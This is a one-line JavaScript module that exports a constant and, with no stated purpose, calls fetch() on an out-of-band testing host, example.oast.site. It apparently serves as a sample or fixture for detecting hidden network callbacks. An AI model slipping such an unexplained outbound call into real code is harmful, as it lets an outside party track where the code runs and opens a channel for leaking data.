const x=1; fetch('https://example.oast.site'); export {x};
